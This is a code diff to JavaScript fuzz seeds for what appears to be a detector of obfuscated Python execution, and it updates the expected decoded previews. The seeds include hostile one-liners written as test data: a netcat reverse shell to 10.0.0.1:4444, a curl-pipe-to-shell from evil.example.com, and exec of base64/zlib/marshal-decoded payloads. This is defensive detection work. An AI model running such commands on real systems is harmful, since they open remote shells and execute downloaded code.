@@ -56,23 +56,30 @@ function genExecZlib() {
   // A structurally-correct base64 of a zlib frame keeps the fuzz honest.
   const out = [];
   // Structure-only: the finder matches on the exec(zlib.decompress(b64decode(b'…')))
-  // shape regardless of payload validity.
+  // shape regardless of payload validity. The decoder emits a
+  // preview of the INFLATED bytes (or, if inflation fails, of the
+  // raw base64-decoded bytes). `b64('aGVsbG8=')` outer-decodes to
+  // the ASCII string `aGVsbG8=`, which is not valid zlib → preview
+  // = `aGVsbG8=`. `b64('x')` outer-decodes to `x` (one byte), not
+  // valid zlib → preview = `x`.
   out.push(makeSeed(
     "import zlib, base64\nexec(zlib.decompress(base64.b64decode(b'" + b64('aGVsbG8=') + "')))",
-    'zlib.decompress',
+    'aGVsbG8=',
   ));
   out.push(makeSeed(
     "exec(zlib.decompress(base64.b64decode('" + b64('x') + "')))",
-    'zlib.decompress',
+    'x',
   ));
   return out;
 }
 
 function genExecMarshal() {
   return [
+    // Decoder emits the b64-decoded marshal bytes as a utf-8 preview.
+    // `cGF5bG9hZA==` decodes to `payload`.
     makeSeed(
       "import marshal, base64\nexec(marshal.loads(base64.b64decode(b'" + b64('payload') + "')))",
-      'marshal.loads',
+      'payload',
     ),
   ];
 }
@@ -170,9 +177,12 @@ function genBuiltinConcat() {
 
 function genSubprocessSink() {
   return [
+    // Decoder emits the EXTRACTED argv (IP, command string) — not the
+    // call name itself. `subprocess.Popen([...10.0.0.1...])` → IP
+    // string in the decoded preview.
     makeSeed(
       "import subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh', '10.0.0.1', '4444'])",
-      'subprocess',
+      '10.0.0.1',
     ),
     makeSeed(
       "subprocess.check_output(['whoami'], shell=True)",
@@ -183,9 +193,12 @@ function genSubprocessSink() {
 
 function genOsSystemSink() {
   return [
+    // Decoder emits the FULL command-string argument, not `os.system`
+    // (the call name appears in the raw; the deobfuscated preview is
+    // what was passed to it).
     makeSeed(
       "import os\nos.system('curl http://evil.example.com/x | sh')",
-      'os.system',
+      'curl http://evil.example.com',
     ),
   ];
 }
